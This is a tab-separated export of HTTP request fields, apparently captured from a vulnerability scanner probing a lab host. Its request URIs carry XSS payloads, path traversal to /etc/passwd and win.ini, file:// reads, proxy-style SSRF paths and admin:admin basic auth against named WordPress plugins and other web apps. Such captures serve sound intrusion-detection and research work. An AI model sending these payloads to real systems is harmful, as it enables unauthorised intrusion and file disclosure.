http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wt3/forceSave.php?file=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/wt3/forceSave.php?file=/etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/docpicker/internal_proxy/http/example.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/docpicker/internal_proxy/http/example.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/wordfence/lib/diffResult.php?file=%27%3E%22%3Csvg%2Fonload=confirm%28%27test%27%29%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/wp-content/plugins/wordfence/lib/diffResult.php?file=%27%3E%22%3Csvg%2Fonload=confirm%28%27test%27%29%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/uploads/affwp-debug.log		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/wp-content/uploads/affwp-debug.log
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/WAN_wan.htm?.gif		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/WAN_wan.htm?.gif
	gzip																close		277	277	application/json						192.168.1.104															1	http://192.168.1.104/web/v2/query		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/v2/query
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/plugins/weathermap/configs/poc.conf		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/plugins/weathermap/configs/poc.conf
	gzip																close		106	106	application/x-www-form-urlencoded;charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/guest_auth/guestIsUp.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/guest_auth/guestIsUp.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/ad-widget/views/modal/?step=../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/wp-content/plugins/ad-widget/views/modal/?step=../../../../../../../etc/passwd%00
	gzip																close										25SnmMo2ORlIn7KvTnQlasc6pCR.tld															1	http://25SnmMo2ORlIn7KvTnQlasc6pCR.tld/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
	gzip																close		89	89	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wps/PA_WCM_Authoring_UI/proxy/http/example.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wps/PA_WCM_Authoring_UI/proxy/http/example.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/socialfit/popup.php?service=googleplus&msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/wp-content/plugins/socialfit/popup.php?service=googleplus&msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
	gzip																close		38	38	application/json						192.168.1.104															1	http://192.168.1.104/web/auth/realms/master/clients-registrations/openid-connect		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/auth/realms/master/clients-registrations/openid-connect
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/1-flash-gallery/		GET				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/wp-content/plugins/1-flash-gallery/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/./../../../../../../../../../../windows/win.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/./../../../../../../../../../../windows/win.ini
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/easy-media-gallery-pro/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/wp-content/plugins/easy-media-gallery-pro/
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip																close		74	74	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web/login.php	1	http://192.168.1.104/web/login.php		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36			PHPSESSID=q4efk7p0vo1866rwdxzq8aeam8	/web/login.php
*/*	gzip	en															close		51	51							192.168.1.104															1	http://192.168.1.104/web/(download)/tmp/poc.txt		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/(download)/tmp/poc.txt
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/uploads/pdf-invoices/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/wp-content/uploads/pdf-invoices/
*/*	gzip	en															close		58	58							192.168.1.104															1	http://192.168.1.104/web/search.php?searchtype=5		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/search.php?searchtype=5
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/weekender/friend.php?id=MTA0&link=aHR0cHM6Ly9leGFtcGxlLmNvbQ==		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/wp-content/themes/weekender/friend.php?id=MTA0&link=aHR0cHM6Ly9leGFtcGxlLmNvbQ==
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/rootDesc.xml		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/rootDesc.xml
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/download.php?file=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/download.php?file=/etc/passwd
	gzip																close		94	94	application/x-www-form-urlencoded; charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/fpui/loginServlet		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/fpui/loginServlet
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/%3Cscript%3Ealert(document.domain)%3C/script%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/%3Cscript%3Ealert(document.domain)%3C/script%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en	admin:admin						Basic YWRtaW46YWRtaW4=								close										192.168.1.104															1	http://192.168.1.104/web/cgi-bin/cgiServer.exx?page=../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/cgi-bin/cgiServer.exx?page=../../../../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/wordfence/lib/diffResult.php?file=%27%3E%22%3Csvg%2Fonload=confirm%28%27test%27%29%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/wp-content/plugins/wordfence/lib/diffResult.php?file=%27%3E%22%3Csvg%2Fonload=confirm%28%27test%27%29%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/uploads/affwp-debug.log		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/wp-content/uploads/affwp-debug.log
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/rest/domains/list?sortCol=fullyQualifiedName&sortDir=asc		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/rest/domains/list?sortCol=fullyQualifiedName&sortDir=asc
	gzip																close		106	106	application/x-www-form-urlencoded;charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/guest_auth/guestIsUp.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/guest_auth/guestIsUp.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
	gzip																close		89	89	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/plugins/weathermap/configs/poc.conf		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/plugins/weathermap/configs/poc.conf
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wps/PA_WCM_Authoring_UI/proxy/http/example.com		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wps/PA_WCM_Authoring_UI/proxy/http/example.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/1-flash-gallery/		GET				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/wp-content/plugins/1-flash-gallery/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/./../../../../../../../../../../windows/win.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/./../../../../../../../../../../windows/win.ini
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/easy-media-gallery-pro/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/wp-content/plugins/easy-media-gallery-pro/
	gzip																close		38	38	application/json						192.168.1.104															1	http://192.168.1.104/web/auth/realms/master/clients-registrations/openid-connect		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/auth/realms/master/clients-registrations/openid-connect
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip																close		74	74	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web/login.php	1	http://192.168.1.104/web/login.php		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36			PHPSESSID=q4efk7p0vo1866rwdxzq8aeam8	/web/login.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/socialfit/popup.php?service=googleplus&msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/wp-content/plugins/socialfit/popup.php?service=googleplus&msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/uploads/pdf-invoices/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/wp-content/uploads/pdf-invoices/
*/*	gzip	en															close		58	58							192.168.1.104															1	http://192.168.1.104/web/search.php?searchtype=5		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/search.php?searchtype=5
*/*	gzip	en															close		51	51							192.168.1.104															1	http://192.168.1.104/web/(download)/tmp/poc.txt		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/(download)/tmp/poc.txt
